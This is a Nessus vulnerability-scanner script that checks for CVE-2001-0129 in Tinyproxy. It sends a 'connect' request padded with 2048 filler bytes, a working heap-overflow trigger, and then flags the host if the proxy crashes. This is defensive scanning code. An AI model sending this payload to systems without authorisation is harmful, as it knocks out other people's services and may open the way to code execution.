#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10596);
 script_bugtraq_id(2217);
script_cve_id("CVE-2001-0129");
 script_version ("$Revision: 1.11 $");
 
 name["english"] = "Tinyproxy heap overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to make the remote service crash
by sending it the command :

	connect AAA[...]AAAA://


It may be possible for an attacker to execute arbitrary code
on this host thanks to this flaw.

Solution : if you are using tinyProxy, then upgrade to version 1.3.3a, or else
           contact your vendor for a patch
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "proxy server heap overflow";
 summary["francais"] = "Dépassement de buffer dans un proxy";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
  script_require_ports("Services/www", "Services/http_proxy", 8888);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/http_proxy"), port:8888);
www = get_kb_list("Services/www");
if(!isnull(www))ports = make_list(ports, www);

foreach port (ports)
{
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  req = string("connect ", crap(2048), "://\r\n\r\n");
  send(socket:soc,
	data:req);

   r = http_recv(socket:soc);
   close(soc);

   soc2 = open_sock_tcp(port);
   if(!soc2)security_hole(port);
  }
 } 
}
